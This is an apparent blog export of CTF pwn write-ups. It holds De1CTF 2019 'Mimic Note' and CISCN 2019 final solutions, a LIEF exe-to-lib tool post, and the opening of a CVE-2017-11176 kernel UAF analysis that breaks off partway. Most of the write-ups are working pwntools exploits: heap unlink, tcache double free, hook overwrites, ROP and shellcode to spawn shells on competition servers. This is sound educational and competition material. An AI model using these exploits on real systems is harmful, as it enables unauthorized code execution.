ret0x0000000000400830 : pop r14 ; pop r15 ; ret0x0000000000400832 : pop r15 ; ret0x000000000040082b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040082f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400690 : pop rbp ; ret0x0000000000400833 : pop rdi ; ret0x0000000000400831 : pop rsi ; pop r15 ; ret0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005d1 : ret''' Mimic Note要用同一个脚本同时打通两个程序并且要让其输出一致（输入不确定是否要一致，但调exp的时候调成一致了）。由于32bit和64bit程序size_t大小不一致，使得两边的unlink不会互相影响，所以只要编排好chunk的顺序就能在两边按次序完成unlink。 unlink完成后利用劫持atoi()@got进行ROP，这里一个较难的点就是要让两个程序同时进入ROP以免程序输出不一致。然后就是疯狂找gadget，同时利用数据的错位，使得两个程序在一次输入后同时进入了ROP。 再往后就是常规的没有输出的情况下进行ROP getshell了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168from pwn import *#context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def add(p, size): p.sendlineafter('&gt;&gt; ', str(1)) p.sendlineafter('size?\n', str(size)) def delete(p, idx): p.sendlineafter('&gt;&gt; ', str(2)) p.sendlineafter('index ?\n', str(idx))def show(p, idx): p.sendlineafter('&gt;&gt; ', str(3)) p.sendlineafter('index ?\n', str(idx))def edit(p, idx, content): p.sendlineafter('&gt;&gt; ', str(4)) p.sendlineafter('index ?\n', str(idx)) p.sendafter('content?\n', content) #sleep(0.5)def pwn(count): DEBUG = 0 arch = '' elf32 = ELF('./mimic_note_32') elf64 = ELF('./mimic_note_64') #if DEBUG == 1 and arch == '64': # p = process('./mimic_note_64') #elif DEBUG == 1 and arch == '32': # p = process('./mimic_note_32') if DEBUG == 1: #p = process('./mimic') #p = remote('127.0.0.1', 9999) p = process('./mimic') else: p = remote('45.32.120.212', 6666) if DEBUG == 1: #pass gdb.attach(p) # 64 bit unlink add(p, 0x100-8) # 0 add(p, 0x100-8) # 1 add(p, 0x100-8) # 2 add(p, 0x100-8) # 3 delete(p, 0) payload = 'a' * (0xf0) + p64(0x200) edit(p, 1, payload) delete(p, 2) add(p, 0x1f8) # 0 is 1 add(p, 0xf8) # 2 payload = p64(0) + p64(0xf1) + p64(0x6020b0-0x18) + p64(0x6020b0-0x10) payload = payload.ljust(0xf0, '\x00') + p64(0xf0) edit(p, 1, payload) delete(p, 2) # 32 bit unlink add(p, 0x100-8) add(p, 0x100-8) add(p, 0x100-4) # 32 bit 5/6/7 add(p, 0x100-4) add(p, 0x100-4) add(p, 0x100-4) delete(p, 5) payload = 'a' * 0xf8 + p32(0x200) edit(p, 6, payload) delete(p, 7) add(p, 0x1f8+4) # 5 is 6 add(p, 0xf8+4) # 7 payload = p32(0) + p32(0xf9) + p32(0x804a090-0x18/2) + p32(0x804a090-0x10/2) payload = payload.ljust(0xf8, '\x00') + p32(0xf8) edit(p, 6, payload) delete(p, 7) # 64 idx 1 /// 32 idx 6 payload = p64(0) + p64(0x602050) + p64(0x20) + p64(0x602818) + p64(0x1000) + p64(0x602200) + p64(0x1000)[:5] edit(p, 1, payload) #0x602058 payload = p32(0xf8) + p32(0x804a060) + p32(0x100) + p32(0x804a060) + p32(0x1000)[:3] edit(p, 6, payload) payload = p32(elf32.got['atoi']) + p32(0x20) + p32(0x804a200) + p32(0x1000) + p32(0x804a7fc) + p32(0x1000) + p32(0x0804a018) + p32(4) edit(p, 6, payload) edit(p, 3, p32(0x080489fb)) # test ############### 64 bit ROP # call read to change write@got to syscall ROP64 = p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['read']) + p64(1) + p64(elf64.got['write']) + p64(0) + p64(0x400C10) ROP64 += p64(0) * 2 + p64(0x602700) + p64(0) * 4 ROP64 += p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['read']) + p64(1) + p64(0x602200) + p64(0) + p64(0x400C10) ROP64 += p64(0) * 2 + p64(59+0x30) + p64(0) * 3 + '/bin/sh\x00'# 0x602900 binsh # set rax ROP64 += p64(0x400B2B) + p64(0) + p64(0) # call syscall ROP64 += p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['write']) + p64(0) + p64(0) + p64(0x602900) + p64(0x400C10) ROP64 += p64(0) * 2 + p64(0x602700) + p64(0) * 4 + p64(0xdeadbeef) edit(p, 1, ROP64) ############### 64 bit ROP ############### 32 bit ROP read_plt = 0x8048460 write_got = 0x804A02C write_plt = 0x80484D0 p_4reg_32 = 0x080489f8 p_ebx_32 = 0x08048439 bin_sh_addr = 0x804a2e8 # call read to change write@got to syscall ROP32 = p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(0x804a300)+p32(1)+p32(0) ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(write_got)+p32(1)+p32(0) ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(0)+p32(0)+p32(0) # set eax, edx ROP32 += p32(0x080489f9) + p32(0) + p32(0) + p32(0xb+0x2c) ROP32 += p32(0x8048907) ROP32 += p32(0) * 9 ROP32 += p32(0x8048588) # set ebx and call syscall ROP32 += p32(p_ebx_32)+p32(bin_sh_addr)+p32(write_plt) edit(p, 2, ROP32) ############### 32 bit ROP # trigger ROP payload = p32(0x80489ee) + p32(0) + p64(0x400c2f)[:6] edit(p, 0, payload) #raw_input() payload = p32(0x602800) + p32(0) + p32(0x804a800-8) + p32(0x8048568) + p64(0x400c2d) + p64(0x602800)[:6] p.sendafter('&gt;&gt; ', payload) ##### first read to change write@got in 64bit p.send('\x7b') ##### second read to change write@got in 32bit p.send(chr(count)) p.interactive() p.close()if __name__ == '__main__': pwn(108) # Bruteforce 32 bit libc]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>de1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【工具】将Linux下executable转为lib的探究]]></title>
    <url>%2F2019%2F08%2F05%2Fexe2lib-in-linux%2F</url>
    <content type="text"><![CDATA[关于如何将PIE的executable转为lib并通过C加载执行特定函数。 参考文章： https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/ https://lief.quarkslab.com/doc/latest/tutorials/08_elf_bin2lib.html LIEFLIEF提供了将bin转为lib的一种方法，需要bin打开了PIE，没开PIE的bin无法转为lib。 123456789101112131415161718192021import lief, sys# usage: python3 exe2so.py bin addr:export_name ...if len(sys.argv) &lt; 3: print("[-] invalid syntax") exit(1)infile = sys.argv[1]elf = lief.parse(infile)for arg in sys.argv[2:]: addr, name = arg.split(":", 1) addr = int(addr, 16) print("[+] exporting '%s' to %#x" % (name, addr,)) elf.add_exported_function(addr, name)outfile = "%s.so" % infileprint("[+] writing shared object as '%s'" % (outfile,))elf.write(outfile)print("[+] done") 使用C语言调用123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;dlfcn.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;alloca.h&gt;#include &lt;string.h&gt;typedef size_t(*func_t)(void);int is_loaded = 0;void* h = NULL;void CloseLibrary() &#123; if(h) &#123; dlclose(h); h = NULL; &#125; return;&#125;int LoadLibrary() &#123; h = dlopen("./bin.so", RTLD_LAZY); atexit(CloseLibrary); return h != NULL;&#125;int main (int argc, char** argv) &#123; if (!is_loaded) &#123; if(!LoadLibrary()) &#123; printf("Load Error\n"); return -1; &#125; is_loaded = 1; printf("Load Success\n"); &#125; func_t func = (func_t)dlsym(h, "export_name"); func(); return 0;&#125;]]></content>
      <tags>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>tool</tag>
        <tag>elf</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛(CISCN)总决赛Pwn WriteUp]]></title>
    <url>%2F2019%2F07%2F28%2Fciscn-2019-final%2F</url>
    <content type="text"><![CDATA[2019国赛总决赛部分Pwn WriteUp。 C05程序一开始打开了flag文件并重定向到了666，在退出函数中，又莫名其妙地可以通过scanf输入。将这两点联系起来就想到了将stdin的fd改为666，使得scanf时操作flag文件的结构体。通过gdb强行修改stdout结构体中的_fileno进行尝试，验证成功。 剩下的部分就是常规的tcache的Use After Free了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *def input_int(p, num): p.sendlineafter('&gt; ', '1') p.sendlineafter('&gt;', '1') p.sendlineafter('your inode number:', str(num))def input_short(p, num): p.sendlineafter('&gt; ', '1') p.sendlineafter('&gt;', '2') p.sendlineafter('your inode number:', str(num))def remove_int(p): p.sendlineafter('&gt; ', '2') p.sendlineafter('&gt;', '1')def remove_short(p): p.sendlineafter('&gt; ', '2') p.sendlineafter('&gt;', '2')def show_int(p): p.sendlineafter('&gt; ', '3') p.sendlineafter('&gt;', '1')def show_short(p): p.sendlineafter('&gt; ', '3') p.sendlineafter('&gt;', '2')def pwn(): DEBUG = 0 if DEBUG == 1: p = process('./inode_heap') context.terminal = ['tmux', 'split', '-h'] context.log_level = 'debug' else: p = remote('172.16.9.21', 9005) context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') input_int(p, 0) remove_int(p) input_short(p, 0) remove_int(p) input_short(p, 0) input_short(p, 0) input_short(p, 0) show_int(p) p.recvuntil('your int type inode number :') recv = p.recvuntil('\n',drop=True) heap_addr = int(recv) if heap_addr &lt; 0x100000000: heap_addr = 0x100000000 + heap_addr input_int(p, heap_addr + 0x80) input_int(p, 0) input_int(p, 0x91) input_int(p, 0) input_int(p, 0) input_int(p, 0x21) for i in range(7): remove_short(p) input_int(p, 0) remove_short(p) show_short(p) p.recvuntil('your short type inode number :') recv = int(p.recvuntil('\n')) if recv &lt; 0: recv = 0x10000 + recv input_short(p, recv - 0x2a0 + 112 - 8) input_short(p, 0x0) input_short(p, 0x0) input_short(p, 0x0) input_short(p, 0x0) remove_short(p) input_int(p, 0) remove_short(p) input_short(p, (heap_addr &amp; 0xffff) + (0x2f0-0x260)) input_short(p, 0x0) input_short(p, 0x0) p.sendlineafter('&gt; ', '1') p.sendlineafter('&gt;', '2') p.sendlineafter('your inode number:', '666') print hex(heap_addr) print hex(recv) if DEBUG == 1: gdb.attach(p) p.interactive()if __name__ == '__main__': pwn() C06常规的没有输出需要通过修改stdout来泄漏glibc地址的题目，程序本身提供了heap地址，所以对于tcache的Double Free也好利用很多。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *def add(p, idx, size, content): p.sendlineafter('choice &gt; ', '1') p.sendlineafter('input the index\n', str(idx)) p.sendlineafter('input the size\n', str(size)) p.sendafter('now you can write something\n', content) p.recvuntil('gift :') recv = p.recvuntil('\n1. add', drop=True) return recvdef delete(p, idx): p.sendlineafter('choice &gt; ', '2') p.sendlineafter('input the index\n', str(idx))def pwn(): DEBUG = 0 if DEBUG == 1: p = process('./pwn') context.terminal = ['tmux', 'split', '-h'] context.log_level = 'debug' else: p = remote('172.16.9.21', 9006) context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') heap_addr = add(p, 0, 0x78, 'sunichi') heap_addr = int(heap_addr, 16) add(p, 1, 0x78, 'sunichi') add(p, 2, 0x78, 'sunichi') #add(p, 3, 0x78, 'sunichi') delete(p, 0) delete(p, 0) add(p, 4, 0x78, p64(heap_addr + 0x70)) add(p, 5, 0x78, 'sunichi') add(p, 6, 0x78, p64(0) + p64(0x101)) add(p, 7, 0x30, '0x30') #add(p, 8, 0x40, '0x40') #add(p, 9, 0x50, '0x50') add(p, 10, 0x60, '0x60') add(p, 11, 0x20, 'sunichi') for i in range(8): delete(p, 1) delete(p, 11) delete(p, 11) add(p, 12, 0x20, p64(heap_addr + 0x80)) add(p, 13, 0x20, '/bin/sh\x00') add(p, 14, 0x20, '\x60\x77') delete(p, 10) delete(p, 10) add(p, 15, 0x60, p64(heap_addr + 0x80)) add(p, 16, 0x60, 'sunichi') add(p, 17, 0x60, 'sunichi') p.sendlineafter('choice &gt; ', '1') p.sendlineafter('input the index\n', str(18)) p.sendlineafter('input the size\n', str(0x60)) p.sendafter('now you can write something\n', p64(0xfbad1800) + p64(0) * 3 + '\x00') sleep(0.5) recv = p.recv(8) recv = p.recv(8) libc.address = u64(recv) - (0x7ffff7a488b0 - 0x00007ffff765b000) print hex(libc.address) delete(p, 7) delete(p, 7) add(p, 3, 0x30, p64(libc.symbols['__free_hook'])) add(p, 8, 0x30, '/bin/sh\x00') add(p, 9, 0x30, p64(libc.symbols['system'])) delete(p, 8) print hex(libc.address) if DEBUG == 1: gdb.attach(p) p.interactive()if __name__ == '__main__': pwn() C10迷宫部分是Sissel大佬写的代码，走完迷宫后会提供glibc地址。后续就是常规的off by null的利用，就是程序申请的chunk较多，需要排列好被利用的chunk的顺序。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229# coding:utf-8from pwn import *def up(location): #横坐标为0，无法再向上走 if location[1] == 0: return False else: new_location = [location[0],location[1]-1] #已经尝试过的点不会尝试第二次 if new_location in route_history: return False #碰到墙不走 elif source[new_location[0]][new_location[1]] == 1: return False else: route_stack.append(new_location) route_history.append(new_location) return True def down(location): if location[1] == 41: return False else: new_location = [location[0],location[1]+1] if new_location in route_history: return False elif source[new_location[0]][new_location[1]] == 1: return False else: route_stack.append(new_location) route_history.append(new_location) return True def left(location): if location[0] == 0: return False else: new_location = [location[0]-1,location[1]] if new_location in route_history: return False elif source[new_location[0]][new_location[1]] == 1: return False else: route_stack.append(new_location) route_history.append(new_location) return True def right(location): if location[0] == 41: return False else: new_location = [location[0]+1,location[1]] if new_location in route_history: return False elif source[new_location[0]][new_location[1]] == 1: return False else: route_stack.append(new_location) route_history.append(new_location) return Truelo = [0,0]route_stack = [[0,0]]ans_stack = []route_history = [[0,0]]source = []def start(p, name, ops): p.sendlineafter('&gt; ', '1') p.sendafter('what\'s your name?\n', name) p.sendlineafter('input you ops count\n', str(len(ops))) p.sendafter('ops: ', ops)def store(p, idx, ifComment, size, comment): p.sendlineafter('&gt; ', '3') p.sendafter('any comment?\n', ifComment) p.sendlineafter('comment size?\n', str(size)) p.sendafter('plz input comment\n', comment)def delete(p, idx): p.sendlineafter('&gt; ', '4') p.sendlineafter('index?\n', str(idx))def pwn(): global lo global route_stack global ans_stack global route_history global source DEBUG = 0 if DEBUG == 1: p = process('./maze') context.terminal = ['tmux', 'split', '-h'] context.log_level = 'debug' else: p = remote('172.16.9.22', 9010) context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('&gt; ') p.sendline('9') a = p.recvuntil('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx') a = p.recvuntil('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx') game = a.split('\n')[1:] for op in game: tmp = [] for ch in op[1:]: tmp.append(0 if ch == ' ' else 1) source += [tmp] while route_stack[-1] != [39,40]: if up(lo): lo = route_stack[-1] ans_stack.append('a') continue if down(lo): lo = route_stack[-1] ans_stack.append('d') continue if left(lo): lo = route_stack[-1] ans_stack.append('w') continue if right(lo): lo = route_stack[-1] ans_stack.append('s') continue #print route_stack route_stack.pop() ans_stack.pop() lo = route_stack[-1] result = '' for op in ans_stack: result += op result += 'dd' print result a = p.recvuntil('&gt; ') print a a = p.sendline('1') a = p.recvuntil('name?\n') p.sendline('sissel') a = p.recvuntil('put you ops count\n') p.sendline(str(len(result))) a = p.recvuntil('ops: ') print a p.sendline(result) p.recvuntil('Here\'s the award:') recv = p.recvuntil('\n0. resume', drop=True) libc.address = int(recv, 16) - libc.symbols['malloc'] print hex(libc.address) p.sendline('0') start(p, 'sunichi\n', 'wwww\n') store(p, 0, 'y', 0x20, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 1, 'y', 0x20, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 2, 'y', 0x20, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 3, 'y', 0x20, 'sunichi\n') delete(p, 0) delete(p, 1) delete(p, 2) delete(p, 3) start(p, 'sunichi\n', 'wwww\n') store(p, 0, 'y', 0xe0, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 1, 'y', 0x68, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 2, 'y', 0xf8, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 3, 'y', 0x40, 'sunichi\n') delete(p, 0) delete(p, 1) delete(p, 2) start(p, 'sunichi\n', 'wwww\n') store(p, 0, 'y', 0x68, '\x00' * 0x60 + p64(0x160)) start(p, 'sunichi\n', 'wwww\n') store(p, 1, 'y', 0xf8, 'sunichi\n') delete(p, 1) start(p, 'sunichi\n', 'wwww\n') store(p, 1, 'y', 0xe0, 'sunichi\n') start(p, 'sunichi\n', 'wwww\n') store(p, 2, 'y', 0x68, 'double\n') start(p, 'sunichi\n', 'wwww\n') store(p, 3, 'y', 0x68, 'double\n') start(p, 'sunichi\n', 'wwww\n') store(p, 4, 'y', 0x68, 'double\n') delete(p, 0) delete(p, 4) delete(p, 2) delete(p, 3) start(p, 'sunichi\n', 'wwww\n') store(p, 2, 'y', 0x68, p64(libc.symbols['__malloc_hook'] - 0x13) + '\n') start(p, 'sunichi\n', 'wwww\n') store(p, 3, 'y', 0x68, 'double\n') start(p, 'sunichi\n', 'wwww\n') store(p, 4, 'y', 0x68, 'double\n') start(p, 'sunichi\n', 'wwww\n') store(p, 5, 'y', 0x68, '\x01' * 3 + p64(libc.address + 0xf02a4) + '\n') delete(p, 2) delete(p, 4) print hex(libc.address) if DEBUG == 1: gdb.attach(p) p.interactive()if __name__ == '__main__': pwn() C17首先有个标记（称其为id）必须进行绕过，由于scanf(&quot;%d&quot;, &amp;id)赋值时是int类型，后续检查这个id的函数将其转换为了int16类型，导致诸如-256*256*256这样的数字能够绕过检查。利用的部分就是通过Use After Free修改关键字符串进入执行shellcode的逻辑。shellcode由用户输入的变换产生，稍微看下就能知道其逻辑。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *def add(p, size, content): p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(size)) p.sendafter('&gt; ', content)def delete(p): p.sendlineafter('&gt; ', str(2))def pwn(): DEBUG = 0 if DEBUG == 1: p = process('./pwn') context.terminal = ['tmux', 'split', '-h'] context.log_level = 'debug' else: p = remote('172.16.9.24', 9017) context.log_level = 'debug' context.arch = 'amd64' context.os = 'linux' p.sendlineafter('&gt; ', 'sunichi') p.sendlineafter('&gt; ', str(-256*256*256)) add(p, 0x68, 'sunichi') delete(p) delete(p) add(p, 0x68, '\x90') add(p, 0x68, 'sunichi') add(p, 0x68, 'The cake is a lie!\x00') if DEBUG == 1: gdb.attach(p) shellcode = asm(shellcraft.sh()) count = len(shellcode) newshellcode = '\x00' while count != 0: newshellcode += chr(ord(newshellcode[len(newshellcode) - 1]) ^ ord(shellcode[count - 1])) count = count - 1 p.sendlineafter('&gt; ', '666') p.sendafter('&gt; ', newshellcode[::-1]) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【翻译&复现】CVE-2017-11176分析(1)]]></title>
    <url>%2F2019%2F07%2F22%2FCVE-2017-11176-1%2F</url>
    <content type="text"><![CDATA[根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。 源自文章： https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html 0x00 前言使用Lexfo的博客中Debian 8.6.0 amd64的Linux系统和VMware Fusion进行调试。原博客中有部分代码和脚本无法在实验环境下运行，直接做了修改，因此本文中部分代码和脚本和原文中不一致。 漏洞复现条件： 内核版本小于4.11.9 amd64架构 内核使用SLAB分配器 开启SMEP 关闭kASLR和SMAP 内存大于512MB 能够对目标系统进行调试 建议只使用1个CPU 测试exploit，系统能够被exp crash（需要针对性地调整exp才能在目标系统上getshell）。 0x01 核心概念 #1进程描述符和current宏每个线程都有一个task_struct： 1234567891011// [include/linux/sched.h]struct task_struct &#123; volatile long state; // process state (running, stopped, ...) void *stack; // task's stack pointer int prio; // process priority struct mm_struct *mm; // memory address space struct files_struct *files; // open file information const struct cred *cred; // credentials // ...&#125;; 通过current宏可以获取当前正在运行的task的结构体指针。 文件描述符、文件对象、文件描述表在Linux中，有七种文件：常规、目录、链接、字设备、块设备、fifo和socket，它们都用文件描述符来表示。文件描述符本质上是一个整数，只有对特定的进程才有意义。每个文件描述符与文件结构体相关联。 文件对象用来表示一个被打开的文件，它并不需要匹配硬盘上的某个映像。指向file结构体的指针通常被命名为filp(file pointer)。 几个最重要的file结构体成员： 123456789// [include/linux/fs.h]struct file &#123; loff_t f_pos; // "cursor" while reading file atomic_long_t f_count; // object's reference counter const struct file_operations *f_op; // virtual function table (VFT) pointer void *private_data; // used by file "specialization" // ...&#125;; 文件描述符和file结构体指针的映射表被称作file descriptor table(fdt)，它并不是1对1映射，可能存在多个描述符映射到同一结构体指针的情况，因此file结构体中有f_count成员来记录引用情况。FDT的结构体被称为fdtable，它就是一个array。 1234567// [include/linux/fdtable.h]struct fdtable &#123; unsigned int max_fds; struct file ** fd; /* current fd array */ // ...&#125;; 将FDT和进程相连接的是files_struct结构体，由于fdtable还包含其他信息，因此并不直接放入task_struct中。files_struct同样可以在多个线程之间共享。 1234567// [include/linux/fdtable.h]struct files_struct &#123; atomic_t count; // reference counter struct fdtable *fdt; // pointer to the file descriptor table // ...&#125;; 指向files_struct的指针保存在task_struct中。 虚函数表(VFT)最广为人知的VFT是struct file_operations： 123456789// [include/linux/fs.h]struct file_operations &#123; ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); int (*open) (struct inode *, struct file *); int (*release) (struct inode *, struct file *); // ...&#125;; 由于Linux中所有东西都被看作文件，但其类型又不一样，所以有着不一样的file operations，常被称作f_ops。 12if (file-&gt;f_op-&gt;read) ret = file-&gt;f_op-&gt;read(file, buf, count, pos); Socket、Sock、SKBsocket结构体位于网络栈的顶层。在socket创建过程中，一个新的file结构体被创建并且f_op被设置为socket_file_ops。由于每个文件以文件描述符的形式表示，因此对文件操作的syscall适用于所有文件，对于socket，内核将调用socket的文件操作： 12345678// [net/socket.c]static const struct file_operations socket_file_ops = &#123; .read = sock_aio_read, // &lt;---- calls sock-&gt;ops-&gt;recvmsg() .write = sock_aio_write, // &lt;---- calls sock-&gt;ops-&gt;sendmsg() .llseek = no_llseek, // &lt;---- returns an error // ...&#125; 由于socket结构体实际上应用了BSD socket API，它集成了一个特殊的VFT结构体proto_ops。每个类型的socket（例如AF_INET、AF_NETLINK等）实现它自己的proto_ops`。 12345678// [include/linux/net.h]struct proto_ops &#123; int (*bind) (struct socket *sock, struct sockaddr *myaddr, int sockaddr_len); int (*connect) (struct socket *sock, struct sockaddr *vaddr, int sockaddr_len, int flags); int (*accept) (struct socket *sock, struct socket *newsock, int flags); // ...&#125; 当BSD形式的系统调用被触发，内核总体上遵循以下架构： 从FDT中检索file结构体 从file结构体中检索socket结构体 调用proto_ops中的操作 因为一些协议的操作可能需要进入到网络栈的底层，所以socket结构体有一个指针指向sock对象。这个指针主要是为了进行socket的协议操作(proto_ops)。socket结构体可以看作是file结构体和sock结构体的”胶水”。 12345678// [include/linux/net.h]struct socket &#123; struct file *file; struct sock *sk; const struct proto_ops *ops; // ...&#125;; sock结构体是一个复杂的结构体，人们可能会把其看作是下层（网卡驱动）和更高级别（socket）之间的中间事物，主要目的是能够以通用方式保持接收和发送的缓冲区。 当通过网卡接收到数据包时，驱动将网络数据包排队到sock的接收缓冲区中。数据包会在缓冲区一直存在直到程序决定接收它（使用recvmsg()系统调用）。发送时也一样，只不过由网卡将数据包从队列移出并发送。 这些网络数据包(are so-called struct sk_buff or skb)。这些缓冲区基本上都是skb的双向链表。 123456789101112// [include/linux/sock.h]struct sock &#123; int sk_rcvbuf; // theorical "max" size of the receive buffer int sk_sndbuf; // theorical "max" size of the send buffer atomic_t sk_rmem_alloc; // "current" size of the receive buffer atomic_t sk_wmem_alloc; // "current" size of the send buffer struct sk_buff_head sk_receive_queue; // head of doubly-linked list struct sk_buff_head sk_write_queue; // head of doubly-linked list struct socket *sk_socket; // ...&#125; sock结构体引用了socket结构体，而socket结构体也引用了sock结构体。同样地，socket结构体引用file结构体，file结构体引用socket结构体（private_data）。这种双向机制允许数据在网络栈中上下移动。 struct sock对象通常称为sk，而struct socket对象通常称为sock。 Netlink SocketNetlink Socket是socket的一种类型，就像UNIX或INET套接字一样。Netlink Socket(AF_NETLINK)允许内核和用户态之间的通信，它可以用来修改路由表、接收SELinux事件通知，甚至与其他用户进程通信。 由于sock和socket结构体是支持各种套接字的通用数据结构，因此有必要在某种程度上进行专门化。从socket角度来看，需要定义proto_ops，对于netlink系列，相关操作是netlink_ops： 123456789// [net/netlink/af_netlink.c]static const struct proto_ops netlink_ops = &#123; .bind = netlink_bind, .accept = sock_no_accept, // &lt;--- calling accept() on netlink sockets leads to EOPNOTSUPP error .sendmsg = netlink_sendmsg, .recvmsg = netlink_recvmsg, // ...&#125; 12345678910// [include/net/netlink_sock.h]struct netlink_sock &#123; /* struct sock has to be the first member of netlink_sock */ struct sock sk; u32 pid; u32 dst_pid; u32 dst_group; // ...&#125;; 换句话说，netlink_sock是具有一些附加属性的sock。 它允许内核在不知道其精确类型的情况下操作通用sock结构体。 它还带来了另一个好处，＆netlink_sock.sk是＆netlink_sock同个地址。 Putting it all together Reference counters为了总结这些内核核心概念的介绍，有必要理解内核如何处理reference counters。为了减少内核内存泄漏和防止UAF，大多数Linux的数据结构中有ref counter，为atomic_t类型（int）。通过如下原子操作对ref counter进行操作： atomic_inc() atomic_add() atomic_dec_and_test() // substract 1 and test if it is equals zero 这些操作都要由开发人员手动完成。但是存在这样的风险： 减少refcounter两次：UAF 增加refcounter两次：内存泄漏或整数溢出导致UAF Linux内核通过普通接口有多种手段处理refcounter(kref,kobject)。但是，它没有系统地使用操作的对象中已有的refcounter helper，而是使用*_get()和*_put()等函数。 在这个例子中，每个对象有不同的helper名字： struct sock: sock_hold(), sock_put() struct file: fget(), fput() struct files_struct: get_files_struct(), put_files_struct() … WARNING: it can get even more confusing! For instance, skb_put() actually does not decrease any refcounter, it “pushes” data into the sk buffer! Do not assume anything about what a function does based on its name, check it. 与本CVE的相关的数据结构以上已介绍完毕，接下来开始分析CVE。 0x02 Public Information首先介绍下mq_notify系统调用的用途，mq_*代表”POSIX message queues”，用来代替System V message queues： 123POSIX message queues allow processes to exchange data in the form of messages.This API is distinct from that provided by System V message queues (msgget(2),msgsnd(2), msgrcv(2), etc.), but provides similar functionality. mq_notify()系统调用用来注册或注销异步提醒： 1mq_notify() allows the calling process to register or unregister for delivery of an asynchronous notification when a new message arrives on the empty message queue referred to by the descriptor mqdes. 相关Patch： 在例如4.11.9的内核代码中，mq_notify()在进入retry逻辑之前没有把sock指针清空。当用户态关闭了netlink socket，这个UAF使得攻击能够发起DoS攻击并有可能造成进一步的影响。 12345678910111213141516diff --git a/ipc/mqueue.c b/ipc/mqueue.cindex c9ff943..eb1391b 100644--- a/ipc/mqueue.c+++ b/ipc/mqueue.c@@ -1270,8 +1270,10 @@ retry: timeo = MAX_SCHEDULE_TIMEOUT; ret = netlink_attachskb(sock, nc, &amp;timeo, NULL);- if (ret == 1)+ if (ret == 1) &#123;+ sock = NULL; goto retry;+ &#125; if (ret) &#123; sock = NULL; nc = NULL; Patch的描述提供了更多的信息： 123456789101112131415mqueue: fix a use-after-free in sys_mq_notify()The retry logic for netlink_attachskb() inside sys_mq_notify()is nasty and vulnerable:1) The sock refcnt is already released when retry is needed2) The fd is controllable by user-space because we already release the file refcntso we then retry but the fd has been just closed by user-spaceduring this small window, we end up calling netlink_detachskb()on the error path which releases the sock again, later whenthe user-space closes this socket a use-after-free could betriggered.Setting &apos;sock&apos; to NULL here should be sufficient to fix it 有漏洞的代码存在于mq_notify 在retry的逻辑中有错误 在sock的计数器上有错误导致UAF 漏洞与已经关闭的fd的条件竞争有关 0x03 Understanding the Bug问题代码重点关注retry的逻辑和函数退出的路径： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 // from [ipc/mqueue.c] SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes, const struct sigevent __user *, u_notification) &#123; int ret; struct file *filp; struct sock *sock; struct sigevent notification; struct sk_buff *nc; // ... cut (copy userland data to kernel + skb allocation) ... sock = NULL; retry:[0] filp = fget(notification.sigev_signo); if (!filp) &#123; ret = -EBADF;[1] goto out; &#125;[2a] 